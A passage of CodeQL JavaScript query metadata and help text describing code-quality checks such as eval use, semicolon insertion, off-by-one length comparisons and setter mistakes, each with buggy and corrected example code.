                      program analysis and understanding. Consequently, these two functions should not be used.
      kind: problem
      problem.severity: recommendation
      id: js/eval-call
      tags: |-
        maintainability
               language-features
               external/cwe/cwe-676
      precision: medium
    queryHelp:
      "# Use of eval\nThe built-in `eval` function and the `Function` constructor\
      \ allow executing arbitrary strings as JavaScript code. This is a dangerous feature,\
      \ since this code has the same access privileges as any other code, so great care\
      \ has to be taken to ensure that malicious code is not accidentally executed this\
      \ way. Using this feature also hampers static checking and program comprehension.\
      \ In many cases, better alternatives are available and should be used instead.\n\
      \n\n## Recommendation\nThere are few genuine uses of `eval` and `Function`. If\
      \ you are trying to assign to a property whose name is not known until runtime,\
      \ use a computed property access. If you are trying to evaluate a string to a\
      \ JSON object, use `JSON.parse`. In other cases, you may be able to use the [Interpreter\
      \ pattern](http://en.wikipedia.org/wiki/Interpreter_pattern).\n\n\n## Example\n\
      In the following example, `eval` is used to define getter and setter methods for\
      \ properties `x` and `y` on `Point.prototype`:\n\n\n```javascript\nfunction Point(x,\
      \ y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\n[\"x\", \"y\"].forEach(function(p)\
      \ {\n\teval(\"Point.prototype.get_\" + p + \" = function() {\" +\n\t     \"  return\
      \ this.\" + p + \";\" +\n\t     \"}\");\n\teval(\"Point.prototype.set_\" + p +\
      \ \" = function(v) {\" +\n\t     \"  if (typeof v !== 'number')\" +\n\t     \"\
      \    throw Error('number expected');\" +\n\t     \"  this.\" + p + \" = v;\" +\n\
      \t     \"}\");\n});\n```\nIn a variant, the programmer has realized that they\
      \ can use computed property accesses to avoid having to wrap the assignment into\
      \ an `eval`, although they still use the `Function` constructor to create the\
      \ accessor functions:\n\n\n```javascript\nfunction Point(x, y) {\n\tthis.x = x;\n\
      \tthis.y = y;\n}\n\n[\"x\", \"y\"].forEach(function(p) {\n\tPoint.prototype[\"\
      get_\" + p] = new Function(\"\",\n\t\t\"return this.\" + p + \";\");\n\tPoint.prototype[\"\
      set_\" + p] = new Function(\"v\",\n\t\t\"if (typeof v !== 'number')\" +\n\t\t\"\
      \  throw Error('number expected');\" +\n\t    \"  this.\" + p + \" = v;\");\n\
      });\n```\nThis is not necessary either as the following example shows, where the\
      \ use of `Function` has also been replaced by computed property accesses:\n\n\n\
      ```javascript\nfunction Point(x, y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\n[\"\
      x\", \"y\"].forEach(function(p) {\n\tPoint.prototype[\"get_\" + p] = function()\
      \ {\n\t\treturn this[p];\n\t};\n\tPoint.prototype[\"set_\" + p] = function(v)\
      \ {\n\t\tif (typeof v !== 'number')\n\t\t\tthrow Error('number expected');\n\t\
      \tthis[p] = v;\n\t};\n});\n```\n\n## References\n* D. Crockford, *JavaScript:\
      \ The Good Parts*, Appendix B.3. O'Reilly, 2008.\n* Common Weakness Enumeration:\
      \ [CWE-676](https://cwe.mitre.org/data/definitions/676.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/ExpressionClosures.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ExpressionClosures.bqrs
    metadata:
      name: Use of platform-specific language features
      description: |-
        Non-standard language features such as expression closures or let expressions
                      make it harder to reuse code.
      kind: problem
      problem.severity: warning
      id: js/non-standard-language-feature
      tags: |-
        quality
               maintainability
               readability
               portability
               language-features
               external/cwe/cwe-758
      precision: very-high
    queryHelp:
      "# Use of platform-specific language features\nNon-standard language\
      \ extensions such as expression closures or `let` expressions should be avoided,\
      \ since they make code harder to read or reuse.\n\n\n## Recommendation\nUse standard\
      \ language features instead. For instance, expression closures can be replaced\
      \ by ECMAScript 2015 arrow functions, or alternatively by plain functions; `let`\
      \ statements and expressions can be replaced by ECMAScript 2015 `let` declarations;\
      \ and `for each ... in` statements can be replaced by ECMAScript 2015 `for ...\
      \ of` statements.\n\n\n## Example\nThe following example uses an expression closure\
      \ with `map`:\n\n\n```javascript\n[1, 2, 3].map(function(x) x * x);\n```\nThe\
      \ equivalent code using an ECMAScript 2015 arrow function is as follows:\n\n\n\
      ```javascript\n[1, 2, 3].map((x) => x * x);\n```\nOn ECMAScript 2015 platforms,\
      \ a plain function can be used instead:\n\n\n```javascript\n[1, 2, 3].map(function\
      \ (x) { return x * x; });\n```\nAs another example, consider this use of a `let`\
      \ statement:\n\n\n```javascript\nfunction sumOfSquares(a) {\n\tvar sum = 0;\n\t\
      for (var i=0; i<a.length; ++i) {\n\t\tlet (square = a[i]*a[i]) {\n\t\t\tsum +=\
      \ square;\n\t\t}\n\t}\n\treturn sum;\n}\n\n```\nIt can easily be replaced by a\
      \ block-scoped `let` declaration:\n\n\n```javascript\nfunction sumOfSquares(a)\
      \ {\n\tvar sum = 0;\n\tfor (var i=0; i<a.length; ++i) {\n\t\tlet square = a[i]*a[i];\n\
      \t\tsum += square;\n\t}\n\treturn sum;\n}\n\n```\nOlder versions of Firefox support\
      \ a postfix notation for array comprehensions:\n\n\n```javascript\nvar numbers\
      \ = [1, 2, 3, 4, 5];\nvar squares = [i*i for (i of numbers)];\n```\nThis notation\
      \ should be converted into the semantically equivalent prefix notation supported\
      \ by newer browsers:\n\n\n```javascript\nvar numbers = [1, 2, 3, 4, 5];\nvar squares\
      \ = [for (i of numbers) i*i];\n```\n\n## References\n* Mozilla Developer Network:\
      \ [Arrow functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions).\n\
      * Mozilla Developer Network: [Non-standard let extensions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Non-standard_let_extensions).\n\
      * Mozilla Developer Network: [for each...in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for_each...in).\n\
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/ForInComprehensionBlocks.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ForInComprehensionBlocks.bqrs
    metadata:
      name: Use of for-in comprehension blocks
      description: |-
        'for'-'in' comprehension blocks are a Mozilla-specific language extension
                      that is no longer supported.
      kind: problem
      problem.severity: error
      id: js/for-in-comprehension
      tags: |-
        quality
               maintainability
               readability
               portability
               language-features
               external/cwe/cwe-758
      precision: very-high
    queryHelp: |
      # Use of for-in comprehension blocks
      `for`-`in` blocks in array comprehensions are a Mozilla-specific language extensions that is no longer supported even by SpiderMonkey, and is unlikely to be included in future ECMAScript standards. This language feature should not be used.


      ## Recommendation
      The `for`-`in` block can be replaced by a (standards-compliant) `for`-`of` block iterating over a list of property names obtained, for example, from `Object.keys`.


      ## Example
      In the following contrived example, a `for`-`in` block is used to iterate over the keys `i` of an array and construct an array of strings of the form `"v = a[i]"`, where `v` is the value of `a[i]`.


      ```javascript
      var a = [23,,42];
      var desc = [for(i in a) i + " = a[" + i + "]"];

      ```
      The example can be rewritten to use a `for`-`of` block iterating over `Object.keys(a)` instead.


      ```javascript
      var a = [23,,42];
      var desc = [for(i of Object.keys(a)) i + " = a[" + i + "]"];

      ```
      Note that `Object.keys` only includes own properties, not properties inherited from a prototype. If the latter behavior is needed, the array comprehension should be replaced by a `for`-`in` loop that imperatively populates the result array.


      ## References
      * Mozilla Developer Network: [Array comprehensions: Differences to the older JS1.7.2/JS1.8 comprehensions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Array_comprehensions#Differences_to_the_older_JS1.7.2FJS1.8_comprehensions).
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/IllegalInvocation.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/IllegalInvocation.bqrs
    metadata:
      name: Illegal invocation
      description: |-
        Attempting to invoke a method or an arrow function using 'new',
                      or invoking a constructor as a function, will cause a runtime
                      error.
      kind: problem
      problem.severity: error
      id: js/illegal-invocation
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: high
    queryHelp: |
      # Illegal invocation
      Class methods and arrow functions must not be invoked using `new`, and attempting to do so will result in a runtime error.

      Conversely, constructors can only be invoked using `new` or `super(...)`, and attempting to invoke them as a normal function will result in a runtime error.


      ## Recommendation
      Correct the invocation in question by adding or removing `new` as appropriate.


      ## Example
      In the following example, `Point` is a class, but on line 8 it is invoked without `new`. This will lead to a runtime error.

      ```javascript

      class Point {
        constructor(x, y) {
          this.x = x;
          this.y = y;
        }
      }

      let p = Point(23, 42);

      ```
      Instead, `new` should be used:

      ```javascript

      class Point {
        constructor(x, y) {
          this.x = x;
          this.y = y;
        }
      }

      let p = new Point(23, 42);

      ```

      ## References
      * Mozilla Developer Network: [Constructors](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/constructor).
      * Mozilla Developer Network: [Arrow functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions).
      * Mozilla Developer Network: [Method definitions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/InconsistentNew.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/InconsistentNew.bqrs
    metadata:
      name: Inconsistent use of 'new'
      description: |-
        If a function is intended to be a constructor, it should always
                      be invoked with 'new'. Otherwise, it should always be invoked
                      as a normal function, that is, without 'new'.
      kind: problem
      problem.severity: warning
      id: js/inconsistent-use-of-new
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: very-high
    queryHelp: |
      # Inconsistent use of 'new'
      JavaScript does not enforce a distinction between constructor functions and normal functions, so the same function can be invoked both as a constructor with `new` and as a normal function without `new`. This is unusual, however, and can often indicate a bug.


      ## Recommendation
      Examine the function in question and all calls to it. If it is not actually meant to be invoked as a constructor, turn all constructor calls to it into normal function calls. If it *is* meant to be invoked as a constructor, either turn all normal function calls to it into constructor calls, or introduce a guard for intercepting calls without `new` as described below.


      ## Example
      In the following example, `Point` is clearly meant to be a constructor function, but on line 7 it is invoked without `new`. This means that `this` in the function body will refer to the global object, so the assignments to `x` and `y` will create global variables.


      ```javascript
      function Point(x, y) {
        this.x = x;
        this.y = y;
      }

      var p = new Point(23, 42),
          q = Point(56, 72);

      ```
      The easiest way to fix this is to rewrite the call on line 7 to use `new`:


      ```javascript
      function Point(x, y) {
        this.x = x;
        this.y = y;
      }

      var p = new Point(23, 42),
          q = new Point(56, 72);

      ```
      Alternatively, if you absolutely have to make it possible to call `Point` both with and without `new`, you could insert a guard that intercepts calls without `new` as follows:


      ```javascript
      function Point(x, y) {
        if (!(this instanceof Point))
          return new Point(x, y);
        this.x = x;
        this.y = y;
      }

      var p = new Point(23, 42),
          q = Point(56, 72);

      ```
      Now, if `Point` is invoked without `new`, its `this` object (which is the global object) is not an instance of `Point`, so the "then" branch of the `if` statement is executed, which re-invokes `Point` on the same arguments, but this time with `new`.


      ## References
      * D. Crockford, *JavaScript: The Good Parts*, Appendix B.11. O'Reilly, 2008.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/InvalidPrototype.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/InvalidPrototype.bqrs
    metadata:
      name: Invalid prototype value
      description: |-
        An attempt to use a value that is not an object or 'null' as a
                      prototype will either be ignored or result in a runtime error.
      kind: problem
      problem.severity: error
      id: js/invalid-prototype-value
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-704
      precision: high
    queryHelp: |
      # Invalid prototype value
      All JavaScript objects (including functions, classes and arrays) have a prototype, which is either `null` or another object. The prototype of an object can be set in two ways, both of which guard against attempts to assign an invalid prototype (such as a primitive value):

      1. Assigning a value to the object's `__proto__` property; if the value is not a valid prototype, the assignment is silently ignored.
      1. Using the standard library functions `Object.create` or `Object.setPrototypeOf`; invalid prototype values lead to a runtime error.
      In summary, any attempt to set the prototype of an object to a value that is not an object or `null` will be ineffective and may lead to a runtime error.


      ## Recommendation
      Fix the prototype assignment by providing a valid prototype value.


      ## Example
      The following code attempts to create an object with prototype `undefined`, which will cause an error at runtime:

      ```javascript

      let dict = Object.create(undefined);

      ```
      If the intention is to create an object without a prototype object, `null` should be used instead:

      ```javascript

      let dict = Object.create(null);

      ```

      ## References
      * Mozilla Developer Network: [Inheritance and the prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain).
      * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/JumpFromFinally.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/JumpFromFinally.bqrs
    metadata:
      name: Jump from finally
      description: |-
        Avoid using unstructured control flow statements (return, continue, or break) inside
                      a 'finally' block.
      kind: problem
      problem.severity: warning
      id: js/exit-from-finally
      tags: |-
        reliability
               maintainability
               language-features
               external/cwe/cwe-584
      precision: low
    queryHelp:
      "# Jump from finally\nA `finally` block is normally used to perform cleanup\
      \ operations at the end of a `try` statement; it is run no matter which way the\
      \ associated `try` statement terminates: successful termination, a `return` statement,\
      \ or an exception being thrown.\n\nIf a `finally` block contains a `return` statement\
      \ or a `break` or `continue` statement referring to a loop outside the `try` statement,\
      \ this statement will jump out of the `finally` block, thus overriding any return\
      \ value or exception throw arising from the `try` statement. This is often unintentional,\
      \ and in any case makes the code hard to read.\n\n\n## Recommendation\nCarefully\
      \ inspect all possible control flow paths through the `try` statement and its\
      \ `finally` block. If the jump out of the `finally` block is unintentional, then\
      \ correct it. If it is intentional, restructure the code to move the jump into\
      \ the main `try` block instead.\n\n\n## Example\nThe following code snippet contains\
      \ a `try` statement that acquires a resource and then performs an action on it.\
      \ However, if the condition checked by function `someCond` holds, an `Error` is\
      \ thrown instead of performing the action. The `finally` block releases the resource,\
      \ and returns `true` if `someOtherCond` returns `true`.\n\nNote that if `someCond`\
      \ and `someOtherCond` both return `true`, the exception thrown on line 5 is suppressed\
      \ by the `return` statement on line 10.\n\n\n```javascript\nvar resource;\ntry\
      \ {\n\tresource = acquire();\n\tif (someCond())\n\t\tthrow new Error();\n\tperformAction(resource);\n\
      } finally {\n\tresource.release();\n\tif (someOtherCond())\n\t\treturn true;\n\
      }\n```\nIf the suppression of the thrown exception is intentional, the check for\
      \ `someOtherCond` should be moved into the `try` statement like this:\n\n\n```javascript\n\
      var resource;\ntry {\n\tresource = acquire();\n\tif (someCond()) {\n\t\tif (someOtherCond())\n\
      \t\t\treturn true;\n\t\telse\n\t\t\tthrow new Error();\n\t}\n\tperformAction(resource);\n\
      \tif (someOtherCond())\n\t\treturn true;\n} finally {\n\tresource.release();\n\
      }\n```\nWhile this transformation leads to some code duplication, it makes the\
      \ control flow more explicit and easier to understand.\n\n\n## References\n* Mozilla\
      \ Developer Network: [try...catch](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch).\n\
      * Common Weakness Enumeration: [CWE-584](https://cwe.mitre.org/data/definitions/584.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/LengthComparisonOffByOne.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/LengthComparisonOffByOne.bqrs
    metadata:
      name: Off-by-one comparison against length
      description: |-
        An array index is compared to be less than or equal to the 'length' property,
                      and then used in an indexing operation that could be out of bounds.
      kind: problem
      problem.severity: warning
      id: js/index-out-of-bounds
      tags: |-
        quality
               reliability
               correctness
               logic
               language-features
               external/cwe/cwe-193
      precision: high
    queryHelp: |
      # Off-by-one comparison against length
      Reading an array element from an index that is greater than the array length always returns `undefined`. If the index is compared to the array length using the less-than-or-equal operator `<=` instead of the less-than operator `<`, the index could be out of bounds, which may not be intentional and may adversely affect performance.


      ## Recommendation
      Use less-than (`<`) rather than less-than-or-equal (`<=`) when comparing a potential index against the array length. For loops that iterate over every element in an array, use a `for...of` loop or the `forEach` method instead of explicitly iterating over all indices.


      ## Example
      The following example shows a function that intends to check whether an array `a` contains an element `elt` by iterating over its elements and comparing them to `elt`. However, the terminating condition of the loop is incorrectly specified as `i <= a.length`, not `i < a.length`, so `elt` will additionally be compared against the value `undefined` read from index `a.length`, meaning that the function considers every array to contain `undefined`:


      ```javascript
      function contains(a, elt) {
        for (let i = 0; i <= a.length; ++i)
          if (a[i] === elt)
            return true;
        return false;
      }
      ```
      The problem can be fixed by using less-than instead of less-than-or-equals:


      ```javascript
      function contains(a, elt) {
        for (let i = 0; i < a.length; ++i)
          if (a[i] === elt)
            return true;
        return false;
      }
      ```

      ## References
      * Mozilla Developer Network: [Array.length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/length)
      * Mozilla Developer Network: [Array.forEach](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach)
      * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)
      * Common Weakness Enumeration: [CWE-193](https://cwe.mitre.org/data/definitions/193.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/NonLinearPattern.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/NonLinearPattern.bqrs
    metadata:
      name: Non-linear pattern
      description: |-
        If the same pattern variable appears twice in an array or object pattern,
                      the second binding will silently overwrite the first binding, which is probably
                      unintentional.
      kind: problem
      problem.severity: error
      id: js/non-linear-pattern
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: very-high
    queryHelp: |
      # Non-linear pattern
      If the same pattern variable is bound multiple times in the same object or array pattern, the last binding overwrites all of the earlier ones. This is most likely unintended and should be avoided.

      In TypeScript, a common mistake is to try to write type annotations inside a pattern. This is not possible, and the type annotation should come after the pattern.


      ## Recommendation
      Rename the pattern variables to have different names. In an array pattern, elements that do not need to be bound can be omitted.


      ## Example
      In the following example, the function `distanceFromOrigin` uses an array pattern to decompose its argument `point`. The pattern binds `x` twice: first, `x` is bound to `point[0]`, the first element of `point`; this binding is then immediately overwritten by a binding to `point[1]`, which is probably unintended.


      ```javascript
      function distanceFromOrigin(point) {
          var [x, x] = point;
          return Math.sqrt(x*x + y*y);
      }

      ```
      From context, it appears that the second binding should have been for variable `y` like this:


      ```javascript
      function distanceFromOrigin(point) {
          var [x, y] = point;
          return Math.sqrt(x*x + y*y);
      }

      ```
      This can sometimes happen in TypeScript, due to the apparent similarity between property patterns and type annotations. In the following example, the function uses a pattern parameter with properties `x` and `y`. These appear to have type `number`, but are in fact untyped properties both stored in a variable named `number`.


      ```javascript
      function distance({x: number, y: number}) {
          return Math.sqrt(x*x + y*y);
      }

      ```
      It is not possible to specify type annotations inside a pattern. The correct way is to specify the type after the parameter:


      ```javascript
      function distance({x, y}: {x: number, y: number}) {
          return Math.sqrt(x*x + y*y);
      }

      ```

      ## References
      * Mozilla Developer Network: [Destructuring assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/PropertyWriteOnPrimitive.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/PropertyWriteOnPrimitive.bqrs
    metadata:
      name: Assignment to property of primitive value
      description: |-
        Assigning to a property of a primitive value has no effect
                      and may trigger a runtime error.
      kind: problem
      problem.severity: error
      id: js/property-assignment-on-primitive
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-704
      precision: high
    queryHelp: |
      # Assignment to property of primitive value
      In JavaScript, primitive values such as numbers and strings are immutable. Assigning to a property of a primitive value has, in general, no effect, while attempting to manipulate such a property using `Object.defineProperty` will result in a runtime error.

      There is one exception: assigning to a property for which a setter has been defined on the corresponding prototype object (such as `Number.prototype` or `String.prototype`) will invoke the setter function.


      ## Recommendation
      Carefully examine the assignment in question. A common mistake is trying to change the contents of a string by treating it as an array of characters and assigning to its elements. This has no effect, since strings are immutable in JavaScript. Instead, a new string should be created using string concatenation.

      Assignments that rely on setters on prototype objects may work as intended, but this behavior is subtle and hard to understand, and therefore should be avoided.


      ## Example
      The following code snippet tries to pad the string `s` to a length divisible by eight by mutating its characters:

      ```javascript

      for (var i=s.length; i%8; ++i)
        s[i] = ' ';

      ```
      This approach will not work because strings are immutable in JavaScript. Instead, string concatenation should be used to pad the string:

      ```javascript

      for (var i=s.length; i%8; ++i)
        s += ' ';

      ```

      ## References
      * Ecma International, [ECMAScript 2016 Language Specification, Section 12.15: Assignment Operators](https://262.ecma-international.org/7.0/#prod-AssignmentExpression).
      * Ecma International, [ECMAScript 2016 Language Specification, Section 19.1.2.4: Object.defineProperty](https://262.ecma-international.org/7.0/#sec-object.defineproperty).
      * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/SemicolonInsertion.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SemicolonInsertion.bqrs
    metadata:
      name: Semicolon insertion
      description:
        Code that uses automatic semicolon insertion inconsistently is hard
        to read and maintain.
      kind: problem
      problem.severity: recommendation
      id: js/automatic-semicolon-insertion
      tags: |-
        quality
               maintainability
               readability
               language-features
               statistical
               non-attributable
      precision: very-high
    queryHelp:
      "# Semicolon insertion\nSome statements in JavaScript do not have to\
      \ be terminated by an explicit semicolon; the parser will implicitly insert a\
      \ semicolon when it encounters a newline character in such situations. This is\
      \ a dangerous feature since it can mask subtle errors and confuse readers; it\
      \ should not be relied on.\n\n\n## Recommendation\nMake the implicitly inserted\
      \ semicolon explicit.\n\n\n## Example\nIn the following code snippet, the programmer\
      \ most likely intended to return an object literal with a single property `status`.\n\
      \n\n```javascript\nfunction f() {\n\treturn\n\t{\n\t\tstatus: 'OK'\n\t}\n}\n```\n\
      However, since there is a newline after the `return` keyword, the parser inserts\
      \ an implicit semicolon after `return`; the object literal is then interpreted\
      \ as a block containing a single statement with the label `status`. Since it comes\
      \ right after a `return`, this block is, of course, never executed, and instead\
      \ of returning an object literal the function now returns `undefined`.\n\nTo fix\
      \ this bug, the opening curly brace of the object literal should be put on the\
      \ same line as the `return` keyword:\n\n\n```javascript\nfunction f() {\n\treturn\
      \ {\n\t\tstatus: 'OK'\n\t};\n}\n```\n\n## References\n* D. Crockford, *JavaScript:\
      \ The Good Parts*, Appendix A.3. O'Reilly, 2008.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/SetterIgnoresParameter.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SetterIgnoresParameter.bqrs
    metadata:
      name: Setter ignores its parameter
      description: |-
        A setter function can silently ignore the new value that the property is meant to
                      be set to, but this may result in unexpected behavior and could indicate a bug.
      kind: problem
      problem.severity: recommendation
      id: js/ignored-setter-parameter
      tags: |-
        reliability
               maintainability
               language-features
      precision: low
    queryHelp:
      "# Setter ignores its parameter\nProperty setter functions that silently\
      \ ignore their parameter make code hard to understand and could indicate an underlying\
      \ bug.\n\n\n## Recommendation\nIf the property is meant to be immutable, the setter\
      \ should throw an exception to flag any mutation attempt.\n\n\n## Example\nThe\
      \ following example shows a constructor function `Point` that uses property accessors\
      \ on `x` and `y` to ensure that they are only set to integer values. However,\
      \ the setter for `y` contains a typo: it erroneously sets `y` to `_x` (which is\
      \ unbound at this point), not to its parameter `_y`.\n\n\n```javascript\nfunction\
      \ Point(x, y) {\n\treturn {\n\t\tget x() { return x; },\n\t\tset x(_x) { x = _x|0;\
      \ },\n\t\tget y() { return y; },\n\t\tset y(_y) { y = _x|0; }\n\t};\n}\n```\n\
      Clearly, the example should be fixed like this:\n\n\n```javascript\nfunction Point(x,\
      \ y) {\n\treturn {\n\t\tget x() { return x; },\n\t\tset x(_x) { x = _x|0; },\n\
      \t\tget y() { return y; },\n\t\tset y(_y) { y = _y|0; }\n\t};\n}\n```\n\n## References\n\
      * Mozilla Developer Network: [Property setters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/SetterReturn.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SetterReturn.bqrs
    metadata:
      name: Useless return in setter
      description: |-
        Returning a value from a setter function is useless, since it will
                      always be ignored.
      kind: problem
      problem.severity: warning
      id: js/setter-return
      tags: |-
        quality
               maintainability
               useless-code
               language-features
      precision: very-high
    queryHelp:
      "# Useless return in setter\nReturning a value from a property setter\
      \ function is useless, since it will always be ignored.\n\n\n## Recommendation\n\
      Remove the return statement altogether, or replace it with a simple `return;`\
      \ statement that does not return a value.\n\n\n## Example\nThe following example\
      \ shows a constructor function `Point` that uses property accessors on `x` and\
      \ `y` to ensure that they are only set to integer values. It returns the new values\
      \ for `x` and `y` from their setters, but these return values will simply be ignored.\n\
      \n\n```javascript\nfunction Point(x, y) {\n\treturn {\n\t\tget x() { return x;\
      \ },\n\t\tset x(_x) { x = _x|0; return x; },\n\t\tget y() { return y; },\n\t\t\
      set y(_y) { y = _y|0; return y; }\n\t};\n}\n```\nIt would be clearer to omit the\
      \ return statements:\n\n\n```javascript\nfunction Point(x, y) {\n\treturn {\n\t\
      \tget x() { return x; },\n\t\tset x(_x) { x = _x|0; },\n\t\tget y() { return y;\
      \ },\n\t\tset y(_y) { y = _y|0; }\n\t};\n}\n```\n\n## References\n* Mozilla Developer\
      \ Network: [Property setters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/SpuriousArguments.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SpuriousArguments.bqrs
    metadata:
      name: Superfluous trailing arguments
      description: A function is invoked with extra trailing arguments that are ignored.
      kind: problem
      problem.severity: warning
      id: js/superfluous-trailing-arguments
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-685
      precision: very-high
    queryHelp:
      "# Superfluous trailing arguments\nFunction calls in JavaScript may pass\
      \ an arbitrary number of arguments to the invoked function. If the invoked function\
      \ declares fewer parameters than arguments were passed, the remaining arguments\
      \ can only be accessed through the `arguments` object. Hence, if a function is\
      \ passed too many arguments but does *not* use the `arguments` object, the remaining\
      \ arguments are useless. Such calls often indicate incomplete refactorings, or\
      \ may point to a misunderstanding of the functionality of the invoked function.\n\
      \n\n## Recommendation\nRemove the extra parameters if they are unnecessary. Otherwise,\
      \ further investigation may be necessary to determine how to update the function\
      \ call.\n\n\n## Example\nThe following code snippet defines a function `f` that\
      \ does not declare any parameters and does not use the `arguments` object. The\
      \ only call to `f` passes it a single argument `42`, which is not used by `f`\
      \ in any way and thus can be removed.\n\n\n```javascript\nfunction f() {\n\tvar\
      \ x = 23;\n\treturn x+19;\n}\n\nf(42);\n```\n\n## References\n* Ecma International,\
      \ *ECMAScript Language Definition*, 5.1 Edition, Section 10. ECMA, 2011.\n* Common\
      \ Weakness Enumeration: [CWE-685](https://cwe.mitre.org/data/definitions/685.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/StrictModeCallStackIntrospection.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/StrictModeCallStackIntrospection.bqrs
    metadata:
      name: Use of call stack introspection in strict mode
      description: |-
        Accessing properties 'arguments.caller', 'arguments.callee',
                      'Function.prototype.caller' or 'Function.prototype.arguments'
                      in strict mode will cause a runtime error.
      kind: problem
      problem.severity: error
      id: js/strict-mode-call-stack-introspection
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: high
    queryHelp: |
      # Use of call stack introspection in strict mode
      The properties `callee` and `caller` of arguments objects as well as the properties `caller` and `arguments` of function objects are not available in strict-mode code, and any attempt to access them will result in a runtime error.


      ## Recommendation
      Instead of using `arguments.callee`, you can refer to the enclosing function by its name (possibly giving it a name first if it is an anonymous function expression). Uses of the other properties can often be eliminated by refactoring the program.


      ## Example
      In the following example, `arguments.callee` is used to recursively invoke the enclosing function, which is anonymous.

      ```javascript

      var o = {
        A: function(x) {
             'use strict';
             if (!(this instanceof arguments.callee))
               return new arguments.callee(x);
             this.x = x;
           }
      };

      ```
      To avoid this use, the function can be given a name and referred to using that name:

      ```javascript

      var o = {
        A: function A(x) {
             'use strict';
             if (!(this instanceof A))
               return new A(x);
             this.x = x;
           }
      };

      ```

      ## References
      * Mozilla Developer Network: [arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/SyntaxError.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SyntaxError.bqrs
    metadata:
      name: Syntax error
      description: A piece of code could not be parsed due to syntax errors.
      kind: problem
      problem.severity: recommendation
      id: js/syntax-error
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: very-high
    queryHelp: |
      # Syntax error
      Syntax errors prevent code from executing correctly. If a piece of code contains syntax errors, this most likely indicates that it is never run and thus is dead code that should be removed.


      ## Recommendation
      Fix the syntax error. It may also be worth investigating whether the file containing the erroneous code fragment is ever included from anywhere. If it is not, then it is dead code, which should be removed.


      ## Example
      In the following example, function `findBox` contains incomplete code: the string literal and its containing block statement are not properly terminated, leading to a syntax error.


      ```javascript
      function findBox() {
        return $("box.important
      ```

      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15.11.6.4. ECMA, 2011.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/TemplateSyntaxInStringLiteral.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/TemplateSyntaxInStringLiteral.bqrs
    metadata:
      name: Template syntax in string literal
      description:
